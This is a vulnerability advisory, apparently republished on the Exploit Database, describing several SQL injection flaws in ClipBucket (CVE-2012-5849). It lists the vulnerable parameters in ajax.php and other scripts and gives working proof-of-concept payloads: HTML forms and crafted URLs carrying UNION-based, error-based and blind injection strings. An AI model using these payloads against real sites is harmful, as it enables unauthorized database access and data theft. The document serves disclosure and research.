Advisory Details:

High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in ClipBucket, which can be exploited to perform SQL Injection attacks.

1) Multiple SQL Injections in ClipBucket: CVE-2012-5849

1.1 The vulnerability exists due to improper sanitation of input in multiple parameters within the "/ajax.php" script. A remote attacker can send a specially crafted HTTP POST request and execute arbitrary SQL queries in application’s database. The following parameter are vulnerable to SQL injection attacks:

 - "uid" (when "mode" is set to "add_friend"). This vulnerability require that attacker is logged-in into the application, however new user registration is open by default ;
 - "id" (when "mode" is set to "share_object" or "add_to_fav", and "type" is set to "video", "photo", or "collection");
 - "id" (when "mode" is set to "rating" and "type" is set to "video", "photo", "collection", or "user"). This vulnerabilities require that attacker is logged-in into the application, however new user registration is open by default;
 - "id" (when "mode" is set to "flag_object" and "type" is set to "video", "group", "user", "photo", or "collection");
 - "cid" (when "mode" is set to "add_new_item" or "remove_collection_item" and "type" is set to "video" or "photo");
 - "cid" (when "mode" is set to "remove_collection_item" and "type" is set to "videos" or "photos");
 - "cid" (when "mode" is set to "get_item" or "load_more_items" and "type" is set to "videos" or "photos");
 - "ci_id" (when "mode" is set to "get_item" and "type" is set to "videos" or "photos").

The following PoC (Proof-of-Concept) codes demonstrate the vulnerabilities.

PoC 1:

<form action="http://[host]/ajax.php" method="post">
<input type="hidden" name="mode" value="add_friend" />
<input type="hidden" name="uid" value="' UNION SELECT 1,2,3,4,5,6,7,version(),9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10 -- " />
<input type="submit" id="btn">
</form>

PoC 2:

<form action="http://[host]/ajax.php" method="post">
<input type="hidden" name="mode" value="get_item" />
<input type="hidden" name="type" value="[videos|photos]" />
<input type="hidden" name="cid" value="0 UNION SELECT 1,2,3,4,5,6,7,version(),9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9 -- " />
<input type="hidden" name="ci_id" value="" />
<input type="submit" id="btn">
</form>

PoC 3:

<form action="http://[host]/ajax.php" method="post">
<input type="hidden" name="mode" value="get_item" />
<input type="hidden" name="type" value="[videos|photos]" />
<input type="hidden" name="cid" value="" />
<input type="hidden" name="ci_id" value="0 UNION SELECT 1,2,3,4,5,6,7,version(),9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9 -- " />
<input type="submit" id="btn">
</form>

PoC 4:

<form action="http://[host]/ajax.php" method="post">
<input type="hidden" name="mode" value="load_more_items" />
<input type="hidden" name="type" value="[videos|photos]" />
<input type="hidden" name="cid" value="0' UNION SELECT 1,2,3,4,5,6,7,version(),9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9 -- " />
<input type="submit" id="btn">
</form>

The second type of PoC code uses error-based SQL injection technique to display SQL server version:

<form action="http://[host]/ajax.php" method="post">
<input type="hidden" name="mode" value="rating" />
<input type="hidden" name="type" value="[video|photo|collection|user]" />
<input type="hidden" name="rating" value="1" />
<input type="hidden" name="id" value="-1 OR 1=(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2))) -- " />
<input type="submit" id="btn">
</form>

The third PoC code demonstrates vulnerability exploitation by blind SQL injection technique:

<form action="http://[host]/ajax.php" method="post">
<input type="hidden" name="mode" value="share_object" />
<input type="hidden" name="type" value="video" />
<input type="hidden" name="id" value="0 OR version()>='5' -- " />
<input type="submit" id="btn">
</form>

If application uses MySQL server version 5 or greater, the result of the above-mentioned HTTP request will be a message saying: "You are not logged in" or "Please enter usernames or emails to send this video".

1.2 The vulnerability was discovered in the "/user_contacts.php" script while handling the "user" HTTP GET parameter. A remote attacker can inject and execute arbitrary SQL commands in application’s database.

The following PoC demonstrates the vulnerability:

http://[host]/user_contacts.php?user=0%27%20UNION%20SELECT%201,2,3,version%28%29,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10%20--%202

1.3 The vulnerability was discovered in the "/view_channel.php" script while handling the "user" HTTP GET parameter. A remote attacker can inject and execute arbitrary SQL commands in application’s database.

The following PoC demonstrates the vulnerability:

http://[host]/view_channel.php?user=0%27%20UNION%20SELECT%201,2,3,version%28%29,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10%20--%202

1.4 The vulnerability exists due to an error in the "view_page.php" script while handling the "pid" HTTP GET parameter. A remote attacker can inject and execute arbitrary SQL commands in application’s database.

The following PoC demonstrates the vulnerability:

http://[host]/view_page.php?pid=0%27%20UNION%20SELECT%201,2,3,4,5,version%28%29,7,8,9,10%20--%202

1.5 The vulnerability was discovered in the "view_topic.php" script while handling the "tid" HTTP GET parameter. A remote attacker can inject and execute arbitrary SQL commands in application’s database.

The following PoC demonstrates the vulnerability:

http://[host]/view_topic.php?tid=0%27%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9,10,11,12%20--%202

1.6 The vulnerability was discovered in the "/watch_video.php" script while handling the "v" HTTP GET parameter. A remote attacker can inject and execute arbitrary SQL commands in application’s database.

Notice: some of the above-mentioned vulnerabilities were described in Secunia Advisory https://secunia.com/advisories/47474/ for the previous versions of ClipBucket, however they were not fixed in the tested version.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
